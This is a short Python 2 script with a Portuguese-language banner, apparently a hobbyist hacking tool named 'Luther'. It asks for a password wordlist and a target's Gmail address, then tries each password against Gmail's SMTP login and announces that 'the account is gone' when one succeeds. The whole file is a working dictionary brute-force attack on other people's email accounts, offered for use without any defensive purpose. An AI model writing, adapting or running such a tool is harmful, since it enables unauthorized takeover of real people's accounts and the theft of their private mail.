
#!/usr/bin/python
'''CRIADO POR WINVASOR'''

import smtplib
from os import system

def main():
   system('clear')
   print '================================================='
   print '               CRIADO POR WINVASOR               '
   print '===================  2019  ======================'
   print '  ____            __  ___                   '
   print ' |    |    __ ___/  |_|  |__   ___________  ' 
   print ' |    |   |  |  \   __\  |  \_/ __ \_  __ \ '
   print ' |    |___|  |  /|  | |   Y  \  ___/|  | \/ '
   print ' |_______ \____/ |__| |___|  /\___ \|__|    '
   print '         \/                \/     \/     1.0'

main()
print '[1] INICIAR LUTHER'
print '[2] SAIR\n'
OPICAO = input('==>')
if OPICAO == 1:
   file_path = raw_input('INSIRA A WORDLIST :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('GMAIL DO ALVO :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] A CONTA JA ERA > :' + password
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] A CONTA JA ERA :' + password

            break
         else:
            print '[!] SENHA NAO EXISTE => ' + password
login()
